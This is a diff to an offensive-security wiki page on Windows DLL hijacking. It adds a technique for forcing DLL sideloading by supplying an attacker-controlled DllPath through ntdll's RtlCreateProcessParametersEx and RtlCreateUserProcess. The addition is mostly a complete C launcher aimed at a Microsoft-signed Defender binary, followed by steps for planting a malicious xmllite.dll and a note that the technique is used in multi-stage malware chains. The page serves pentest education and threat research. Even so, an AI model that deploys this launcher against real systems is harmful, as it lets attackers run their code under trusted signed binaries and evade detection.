@@ -62,6 +62,99 @@ Finally, note that **a dll could be loaded indicating the absolute path instead 
 
 There are other ways to alter the ways to alter the search order but I'm not going to explain them here.
 
+### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath
+
+An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.
+
+Key idea
+- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
+- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.
+
+Notes/limitations
+- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
+- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
+- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.
+
+Minimal C example (ntdll, wide strings, simplified error handling):
+
+```c
+#include <windows.h>
+#include <winternl.h>
+#pragma comment(lib, "ntdll.lib")
+
+// Prototype (not in winternl.h in older SDKs)
+typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
+    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
+    PUNICODE_STRING ImagePathName,
+    PUNICODE_STRING DllPath,
+    PUNICODE_STRING CurrentDirectory,
+    PUNICODE_STRING CommandLine,
+    PVOID Environment,
+    PUNICODE_STRING WindowTitle,
+    PUNICODE_STRING DesktopInfo,
+    PUNICODE_STRING ShellInfo,
+    PUNICODE_STRING RuntimeData,
+    ULONG Flags
+);
+
+typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
+    PUNICODE_STRING NtImagePathName,
+    ULONG Attributes,
+    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
+    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
+    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
+    HANDLE ParentProcess,
+    BOOLEAN InheritHandles,
+    HANDLE DebugPort,
+    HANDLE ExceptionPort,
+    PRTL_USER_PROCESS_INFORMATION ProcessInformation
+);
+
+static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
+    DWORD n = GetModuleFileNameW(h, out, cch);
+    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
+}
+
+int wmain(void) {
+    // Target Microsoft-signed, DLL-hijackable binary (example)
+    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";
+
+    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
+    wchar_t dllDir[MAX_PATH];
+    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);
+
+    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
+    RtlInitUnicodeString(&uImage, image);
+    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
+    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
+    RtlInitUnicodeString(&uCurDir, dllDir);
+
+    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
+        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
+    RtlCreateUserProcess_t pRtlCreateUserProcess =
+        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");
+
+    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
+    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
+                                                NULL, NULL, NULL, NULL, NULL, 0);
+    if (st < 0) return 1;
+
+    RTL_USER_PROCESS_INFORMATION pi = {0};
+    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
+    if (st < 0) return 1;
+
+    // Resume main thread etc. if created suspended (not shown here)
+    return 0;
+}
+```
+
+Operational usage example
+- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
+- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.
+
+This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.
+
+
 #### Exceptions on dll search order from Windows docs
 
 Certain exceptions to the standard DLL search order are noted in Windows documentation:
@@ -235,6 +328,9 @@ BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReser
 - [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
 - [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
 
+
+
+- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
 
 
 {{#include ../../banners/hacktricks-training.md}}
